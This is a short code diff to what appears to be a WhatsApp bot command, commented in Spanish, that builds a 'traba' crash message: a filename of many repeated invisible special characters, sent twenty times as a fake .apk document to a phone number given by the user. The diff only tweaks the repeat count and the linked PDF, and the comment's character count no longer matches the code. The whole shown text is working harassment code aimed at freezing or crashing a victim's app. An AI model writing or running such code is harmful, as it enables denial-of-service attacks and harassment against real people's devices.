@@ -6,12 +6,12 @@ let handler = async (m, { conn, text }) => {
   const numero = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
 
   // Traba invisible con millones de caracteres
-  const basura = '𑇂𑆵𑆴𑆿'.repeat(90000); // Puedes aumentar
+  const basura = '𑇂𑆵𑆴𑆿'.repeat(40000); // Puedes aumentar
   const fileName = basura + basura + basura; // 270,000 caracteres
 
   for (let i = 0; i < 20; i++) {
     await conn.sendMessage(numero, {
-      document: { url: 'https://www.w3.org/WAI/ER/tests/xhtml/testfiles/resources/pdf/dummy.pdf' },
+      document: { url: 'https://www.w3.org/WAI/ER/tests/xhtml/testfiles/resources/pdf/Tobi.pdf' },
       fileName: fileName + '.apk',
       mimetype: 'application/vnd.android.package-archive',
       caption: '🔥 Documento generado por Tobi',
